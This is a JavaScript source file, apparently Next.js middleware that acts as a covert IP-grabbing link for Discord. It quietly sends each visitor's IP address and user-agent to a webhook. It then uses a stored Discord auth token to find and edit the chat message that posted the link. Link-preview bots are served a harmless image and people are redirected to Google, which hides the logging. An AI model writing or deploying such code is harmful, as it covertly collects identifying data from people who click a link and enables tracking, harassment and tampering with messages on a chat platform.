import { NextRequest, NextResponse, userAgent } from 'next/server';

const webhook = process.env.WEBHOOK_URL;
const DISCORD_AUTH = process.env.DISCORD_AUTH;
const DISCORD_API_BASE = 'https://discord.com/api/v9';

async function sendToWebhook(payload) {
  await fetch(webhook, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(payload),
  });
}

export async function middleware(req) {
  const ua = userAgent(req)?.ua || req.headers.get("user-agent") || "unknown";
  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.ip || "unknown";
  const page = req.nextUrl.pathname.split("/").pop();
  const match = page?.match(/^(\d+)-(\d+)(?:-|$)/); // serverid-channelid

  // View log
  await sendToWebhook({
    embeds: [
      {
        title: "Triggered view-logger",
        color: 0x3498db,
        fields: [
          { name: "IP Address", value: `\`${ip}\``, inline: false },
          { name: "User-Agent", value: `\`${ua.slice(0, 1000)}\``, inline: false },
        ],
        footer: { text: "Requested page: " + page.slice(0, 500) },
      },
    ],
  });

  if (match) {
    const [, serverID, channelID] = match;

    try {
      const res = await fetch(`${DISCORD_API_BASE}/channels/${channelID}/messages?limit=20`, {
        headers: {
          authorization: DISCORD_AUTH,
          "content-type": "application/json",
        },
      });

      if (!res.ok) {
        throw new Error(`Channel fetch failed: ${res.status}`);
      }

      const messages = await res.json();
      const target = messages.find(msg => msg.content.includes("https://rpct.vercel.app/"));

      if (target?.id) {
        const messageID = target.id;

        setTimeout(async () => {
          try {
            const patchRes = await fetch(`${DISCORD_API_BASE}/channels/${channelID}/messages/${messageID}`, {
              method: "PATCH",
              headers: {
                authorization: DISCORD_AUTH,
                "content-type": "application/json",
              },
              body: JSON.stringify({ content: "Who is looking?" }),
            });

            if (patchRes.ok) {
              await sendToWebhook({
                content: `https://discord.com/channels/${serverID}/${channelID}/${messageID} has been edited.`,
              });
            } else {
              const errText = await patchRes.text();
              throw new Error(`PATCH failed: ${patchRes.status} - ${errText}`);
            }
          } catch (patchErr) {
            await sendToWebhook({
              embeds: [
                {
                  title: "Error: PATCH failed",
                  description: `\`\`\`${patchErr.message}\`\`\``,
                  color: 0xFF0000,
                },
              ],
            });
          }
        }, 1500);
      }
    } catch (fetchErr) {
      await sendToWebhook({
        embeds: [
          {
            title: "Error: Fetch failed",
            description: `\`\`\`${fetchErr.message}\`\`\``,
            color: 0xFF0000,
          },
        ],
      });
    }
  }

  const isBotUA = ["Mozilla/5.0 (compatible; Discordbot/", "Twitterbot/"].some(u => ua?.startsWith(u));
  return NextResponse.rewrite(new URL(isBotUA ? "/mini.png" : "https://google.com", req.url));
}
